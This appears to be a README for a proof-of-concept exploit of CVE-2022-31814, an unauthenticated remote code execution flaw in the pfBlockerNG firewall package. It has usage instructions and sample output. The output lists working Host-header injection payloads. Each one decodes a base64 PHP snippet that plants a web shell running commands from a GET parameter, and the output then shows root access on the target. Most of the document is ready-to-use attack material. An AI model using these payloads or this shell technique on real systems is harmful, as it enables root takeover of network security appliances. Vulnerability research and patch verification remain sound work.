# CVE-2022-31814

Updated Exploit - pfBlockerNG &lt;= 2.1.4_26 Unauth RCE (CVE-2022-31814)


## Description

This script is a proof-of-concept exploit for pfBlockerNG <= 2.1.4_26 that allows for remote code execution. It takes a single target URL or a list of URLs, tries to upload a shell using multiple payloads, executes a command, and then deletes the shell.


## Requirements

This script requires Python 3.x and the request module to be installed. You can install these modules by running:

```bash
pip3 install requests
```

or

```bash
pip3 install -r requirements.txt
```

## Usage 

```bash
usage: CVE-2022-31814.py [-h] --url URL

pfBlockerNG <= 2.1.4_26 Unauth RCE

options:
  -h, --help  show this help message and exit
  --url URL   Full URL and port e.g.: https://10.10.10.10:443/
```

## Exploit Execution


```bash
python3 CVE-2022-31814.py --url "https://10.10.10.10:443/"
```

## Output

```
[+] pfBlockerNG is installed
[/] Uploading shell...
[+] Testing Payload: {'Host': "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python3.8 -m base64 -d | php; '"}
[+] Testing Payload: {'Host': "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python3 -m base64 -d | php; '"}
[+] Testing Payload: {'Host': "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python2 -m base64 -d | php; '"}
[+] Testing Payload: {'Host': "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBwcmludChwYXNzdGhydSggJF9HRVRbImMiXSkpOz8+Jztmd3JpdGUoJGEsJHQpO2ZjbG9zZSggJGEpOz8+'|python -m base64 -d | php; '"}
[+] Testing Payload: {'Host': "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKHBhc3N0aHJ1KCAkX0dFVFsiYyJdKSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4='|python -m base64 -d | php; '"}
[+] Testing Payload: {'Host': "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKHBhc3N0aHJ1KCAkX0dFVFsiYyJdKSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4='|python3 -m base64 -d | php; '"}
[+] Testing Payload: {'Host': "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKHBhc3N0aHJ1KCAkX0dFVFsiYyJdKSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4='|python2 -m base64 -d | php; '"}
[+] Testing Payload: {'Host': "' *; echo 'PD8kYT1mb3BlbigiL3Vzci9sb2NhbC93d3cvc3lzdGVtX2FkdmFuY2VkX2NvbnRyb2wucGhwIiwidyIpIG9yIGRpZSgpOyR0PSc8P3BocCBlY2hvKHBhc3N0aHJ1KCAkX0dFVFsiYyJdKSk7Pz4nO2Z3cml0ZSgkYSwkdCk7ZmNsb3NlKCAkYSk7Pz4='|python3.8 -m base64 -d | php; '"}
[+] Upload succeeded
# id 
uid=0(root) gid=0(wheel) groups=0(wheel)

# whoami
root

# ^C[+] Shell deleted
```
